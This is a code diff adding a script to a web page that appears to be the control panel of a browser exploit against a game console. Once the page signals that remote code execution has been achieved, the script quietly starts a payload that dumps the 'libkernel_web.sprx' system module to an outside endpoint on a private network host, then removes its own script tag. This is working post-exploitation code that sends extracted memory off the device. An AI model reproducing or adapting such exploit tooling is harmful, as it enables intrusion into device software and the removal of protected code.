@@ -1432,5 +1432,37 @@ $("btnTestSyscall").onclick = () => {
       </div>
     </div>
   </div>
+<script>
+"use strict";
+// lite auto-dump: fires the quiet paced payload 1.5s after RCE is live —
+// no manual CHECK/DUMP clicking (the carrier overlap only survives briefly
+// after arming; manual clicking = seconds of delay = pre-ping death).
+(function liteAutoDump() {
+  if (window.notifyReady === true && typeof window.aimRead === "function"
+      && window.deepslopModuleRegistry) {
+    window.__LITE_QUIET_PAYLOAD = true;
+    window.setDumpProgress = function () { };
+    window.setDumpRowStatus = function () { };
+    window.setDumpStatus = function (m) {
+      try { document.getElementById("dumpStatus").textContent = String(m); } catch (e) { }
+    };
+    window.setDumpStatus("RCE ACTIVE — auto-dump starting (quiet, do not touch)");
+    window.__DEEPSLOP_DUMP_REQUEST = {
+      module: "libkernel_web.sprx",
+      speed: "low",
+      mode: "dump",
+      endpoint: "https://adityas-macbook-pro.tailddb851.ts.net/__deepslop/dump"
+    };
+    setTimeout(function () {
+      var p = document.createElement("script");
+      p.src = "payloads/sprx_dump_lite.js?_=" + Date.now();
+      p.onload = function () { if (p.parentNode) p.parentNode.removeChild(p); };
+      document.body.appendChild(p);
+    }, 1500);
+    return;
+  }
+  setTimeout(liteAutoDump, 500);
+})();
+</script>
 </body>
 </html>
